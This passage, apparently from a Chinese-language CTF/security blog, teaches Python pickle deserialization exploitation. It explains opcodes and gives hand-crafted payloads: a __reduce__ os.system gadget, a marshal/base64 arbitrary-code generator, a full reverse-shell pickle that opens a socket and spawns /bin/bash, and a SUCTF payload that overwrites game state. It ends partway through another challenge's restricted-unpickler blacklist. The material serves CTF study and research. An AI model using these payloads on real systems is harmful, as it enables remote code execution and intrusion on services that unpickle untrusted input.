class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="pickle介绍"><a href="#pickle介绍" class="headerlink" title="pickle介绍"></a>pickle介绍</h2><h3 id="pickle的大致过程"><a href="#pickle的大致过程" class="headerlink" title="pickle的大致过程"></a>pickle的大致过程</h3><p>以Foo类为例</p>
<ol>
<li>提取出Foo类中的所有attribute(从<code>__dict__</code>中获得)将其转化为键值对</li>
<li>写入对象类名</li>
<li>写入第一步生成的键值对</li>
</ol>
<h3 id="unpickle的大致过程"><a href="#unpickle的大致过程" class="headerlink" title="unpickle的大致过程"></a>unpickle的大致过程</h3><ol>
<li>获取pickle流</li>
<li>重新构建属性列表</li>
<li>根据保存的类名来创建对象</li>
<li>将属性列表恢复到对象中</li>
</ol>
<h3 id="pvm组成-解析pickle"><a href="#pvm组成-解析pickle" class="headerlink" title="pvm组成(解析pickle)"></a>pvm组成(解析pickle)</h3><ol>
<li>指令解释器<br>最后一步一定是返回栈顶元素</li>
<li>栈 </li>
<li>memo(临时保存数据)<br>用类似list的方式来读取和储存数据,以字典方式实现<br>如p100,意为把栈顶元素保存到memo中索引为100</li>
</ol>
<h3 id="pvm指令格式"><a href="#pvm指令格式" class="headerlink" title="pvm指令格式"></a>pvm指令格式</h3><ol>
<li><p>pvm的操作码只有一个字节</p>
</li>
<li><p>需要参数的操作码,要在每一个参数后面加上换行符</p>
</li>
<li><p>从pickle流中读取数据,并加载到栈上</p>
</li>
</ol>
<h2 id="如何生成pickle"><a href="#如何生成pickle" class="headerlink" title="如何生成pickle"></a>如何生成pickle</h2><h3 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h3><h4 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>加载到栈上的数据类型</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>S</td>
<td>string</td>
<td>String</td>
<td>S’foo’\n</td>
</tr>
<tr>
<td>V</td>
<td>unicode</td>
<td>unicode</td>
<td>Vfo\u006f\n</td>
</tr>
<tr>
<td>I</td>
<td>int</td>
<td>int</td>
<td>I42\n</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="修改栈-memo"><a href="#修改栈-memo" class="headerlink" title="修改栈/memo"></a>修改栈/memo</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>(</td>
<td>MARK</td>
<td>向栈中加入一个标记</td>
<td>(</td>
</tr>
<tr>
<td>0</td>
<td>POP</td>
<td>弹出栈顶元素并丢弃</td>
<td>0</td>
</tr>
<tr>
<td>p<code>&lt;memo_index&gt;</code>\n</td>
<td>PUT</td>
<td>复制栈顶元素到memo中</td>
<td>p101\n</td>
</tr>
<tr>
<td>g<code>&lt;memo_index&gt;</code>\n</td>
<td>GET</td>
<td>将memo中指定元素拷贝到栈顶</td>
<td>g101\n</td>
</tr>
</tbody></table>
<h4 id="生成-修改列表-字典-元组"><a href="#生成-修改列表-字典-元组" class="headerlink" title="生成/修改列表,字典,元组"></a>生成/修改列表,字典,元组</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>l</td>
<td>列表</td>
<td>将栈顶到遇到的第一个mask之间的元素到一个列表,并将这个列表放入栈中</td>
<td>(S’string’\nl</td>
</tr>
<tr>
<td>t</td>
<td>元组</td>
<td>将栈顶到遇到的第一个mask之间的元素放到一个元组中,并将这个元组放入栈中</td>
<td>(S’string’\nS’string2’\nt</td>
</tr>
<tr>
<td>d</td>
<td>字典</td>
<td>将栈顶到遇到的第一个mask之间的元素放到一个字典中,并将这个字典放入栈中</td>
<td>(S’key1’\nS’value1’\nS’key2’\nS’value2’\nd</td>
</tr>
<tr>
<td>s</td>
<td>SETITEM</td>
<td>从栈出弹出三个值:字典,键,值,将键值对合并到字典中</td>
<td>(S’key1’\nS’val1’\nS’key2’\nI123\ndS’key3’\nS’val 3’\ns</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="pickle-流生成元组的过程"><a href="#pickle-流生成元组的过程" class="headerlink" title="pickle 流生成元组的过程"></a>pickle 流生成元组的过程</h4><ul>
<li><p>生成元组的指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(S&#x27;str1&#x27;</span><br><span class="line">S&#x27;str2&#x27;</span><br><span class="line">I1234</span><br><span class="line">t</span><br></pre></td></tr></table></figure></li>
<li><p>生成元组的过程图</p>
</li>
</ul>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg" alt="image5192"></p>
<h4 id="加载对象"><a href="#加载对象" class="headerlink" title="加载对象"></a>加载对象</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>GLOBAL</td>
<td>需要两个参数(module,class)来创建对象,并将其放到栈中</td>
<td>cos\nsystem\n</td>
</tr>
<tr>
<td>R</td>
<td>REDUCE</td>
<td>弹出一个参数元组和一个可调用对象（可能是由GLOBAL加载的），将参数应用于可调用对象并将结果压入栈中</td>
<td>cos\nsystem\n(S’sleep 10’\ntR</td>
</tr>
</tbody></table>
<h4 id="加载对象过程图"><a href="#加载对象过程图" class="headerlink" title="加载对象过程图"></a>加载对象过程图</h4><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg" alt="image5725"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg" alt="image5808"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg" alt="image5889"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg" alt="image5970"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg" alt="image6051"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg" alt="image6132"></p>
<h2 id="编写pickle的一些技巧"><a href="#编写pickle的一些技巧" class="headerlink" title="编写pickle的一些技巧"></a>编写pickle的一些技巧</h2><p>我们如何执行如下的代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;/path/to/massive/sikrit&#x27;</span>) </span><br><span class="line">f.read()</span><br></pre></td></tr></table></figure>

<p>思路是:首先执行open函数,将其储存在memo里面,在利用魔术方法来执行f.read()</p>
<p><code>f.read()</code>可以等价替换成<code>__builtin__.apply( __builtin__.getattr(file,&#39;read&#39;), [f])</code></p>
<p>最后合成的pickle是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#step1</span><br><span class="line">c__builtin__</span><br><span class="line">open</span><br><span class="line">(S&#x27;/path/to/massive/sikrit&#x27;</span><br><span class="line">tRp100</span><br><span class="line">#step2</span><br><span class="line">c__builtin__</span><br><span class="line">apply</span><br><span class="line">(c__builtin__</span><br><span class="line">getattr</span><br><span class="line">(c__builtin__</span><br><span class="line">file</span><br><span class="line">S&#x27;read&#x27;</span><br><span class="line">tR(g100</span><br><span class="line">ltR.</span><br></pre></td></tr></table></figure>



<h3 id="手写pickle模板"><a href="#手写pickle模板" class="headerlink" title="手写pickle模板"></a>手写pickle模板</h3><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg" alt="image6628"></p>
<h3 id="利用-reduce-来生成pickle代码"><a href="#利用-reduce-来生成pickle代码" class="headerlink" title="利用__reduce__来生成pickle代码"></a>利用<code>__reduce__</code>来生成pickle代码</h3><p><code>__reduce__</code></p>
<blockquote>
<p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。 </p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;ls&#x27;</span>,))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Test(), protocol=<span class="number">0</span>))</span><br></pre></td></tr></table></figure>



<h3 id="利用marshal和cPickle来生成代码"><a href="#利用marshal和cPickle来生成代码" class="headerlink" title="利用marshal和cPickle来生成代码"></a>利用marshal和cPickle来生成代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;bit4&#x27;</span></span><br><span class="line">__github__ = <span class="string">&#x27;https://github.com/bit4woo&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span><span class="comment">#you should write your code in this function</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n-<span class="number">1</span>) + fib(n-<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;fib(10) =&#x27;</span>, fib(<span class="number">10</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#为了保证code_serialized中的内容得到执行，我们需要如下代码</span></span><br><span class="line"><span class="comment">#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), &#x27;&#x27;))()</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;%s&#x27;</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span> % base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>



<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><h3 id="通过源码查看pickle的方法"><a href="#通过源码查看pickle的方法" class="headerlink" title="通过源码查看pickle的方法"></a>通过源码查看pickle的方法</h3><p>直接所有操作码对应的变量</p>
<p><img src="https://i.loli.net/2019/12/23/pWlFyYPKB7enMQE.png" alt="image7895"></p>
<p><code> dispatch[BININT1[0]] = load_binint1</code></p>
<p>找到类似这种的后面的就是对应的函数</p>
<h2 id="pickle工具"><a href="#pickle工具" class="headerlink" title="pickle工具"></a>pickle工具</h2><p> <a target="_blank" rel="noopener" href="https://github.com/sensepost/anapickle">converttopickle.py</a></p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p> <a target="_blank" rel="noopener" href="https://github.com/sensepost/anapickle/blob/master/anapickle.py">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a> </p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS&#x27;__getitem__&#x27;\ntRp102\n0g102\n(S&#x27;AF_INET&#x27;\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS&#x27;__getitem__&#x27;\ntRp105\n0g105\n(S&#x27;SOCK_STREAM&#x27;\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS&#x27;__getitem__&#x27;\ntRp108\n0g108\n(S&#x27;IPPROTO_TCP&#x27;\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS&#x27;__getitem__&#x27;\ntRp111\n0g111\n(S&#x27;SOL_SOCKET&#x27;\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS&#x27;__getitem__&#x27;\ntRp114\n0g114\n(S&#x27;SO_REUSEADDR&#x27;\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#x27;setsockopt&#x27;\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#x27;connect&#x27;\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S&#x27;localhost&#x27;\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS&#x27;fileno&#x27;\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S&#x27;/bin/bash&#x27;\ntI0\nS&#x27;/bin/bash&#x27;\ng122\ng122\ng122\ntRp123\n0S&#x27;finished&#x27;\n.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>localhost:55555</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
<li>使用v0版的pickle协议,保证shellcode的通用性</li>
</ol>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="suctf-guess-game"><a href="#suctf-guess-game" class="headerlink" title="suctf guess_game"></a>suctf guess_game</h3><p><a target="_blank" rel="noopener" href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game">题目链接</a></p>
<p>考点:pickle</p>
<p>代码审计一波后</p>
<p>如果猜对10次后会给flag(机会只有10次)</p>
<p>因为知道是考pickle直接全局搜索pickle发现在server处有</p>
<p><code>ticket = restricted_loads(ticket)</code></p>
<p>其中ticket是我们可控点</p>
<p>跟进去看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;guess_game&quot;</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>

<p>我们只能加载guess_game中的类,并且不能调用魔术方法.</p>
<p>在这一题中拿到flag有两种方式:</p>
<ol>
<li>命令执行</li>
<li>通过游戏</li>
</ol>
<p>在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了</p>
<p>而游戏中判定赢的条件是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class">	<span class="title">def</span> <span class="title">is_win</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br></pre></td></tr></table></figure>

<p>如果我们能直接修改win_count或者max_round就可以拿到flag了</p>
<p>我们发现在<code>guess_game</code>中已经有一个<code>game = Game()</code>这个了,也就是我们可以利用pickle来加载这个game直接修改</p>
<p>那么接下来就是如何修改了</p>
<p>在pickle的操作码中我们发现</p>
<p><code>BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()</code>这一条</p>
<p>其中update()就可以修改game的属性了</p>
<p>那么接下来就只有一个问题了,操作码<code>b</code>如何使用</p>
<p>一路跟踪发现b操作码的实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_build</span>(<span class="params">self</span>):</span></span><br><span class="line">    stack = self.stack</span><br><span class="line">    state = stack.pop()</span><br><span class="line">    inst = stack[-<span class="number">1</span>]</span><br><span class="line">    setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        setstate(state)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    slotstate = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    <span class="keyword">if</span> slotstate:</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">            <span class="built_in">setattr</span>(inst, k, v)</span><br></pre></td></tr></table></figure>

<p>没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象</p>
<p>最后的payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&quot;cguess_game\ngame\n(S&#x27;win_count&#x27;\nI10\nS&#x27;round_count&#x27;\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="code-breaking-picklecode"><a href="#code-breaking-picklecode" class="headerlink" title="code breaking picklecode"></a>code breaking picklecode</h3><p><a target="_blank" rel="noopener" href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode">题目链接</a></p>
<p>代码审计发现在index处可以ssti</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">request</span>):</span></span><br><span class="line">    django_engine = engines[<span class="string">&#x27;django&#x27;</span>]</span><br><span class="line">    template = django_engine.from_string(<span class="string">&#x27;My name is &#x27;</span> + request.user.username)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.render(<span class="literal">None</span>, request))</span><br></pre></td></tr></table></figure>

<p>但是django难以利用ssti命令执行但是能读取敏感配置</p>
<p>结合serializer.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">    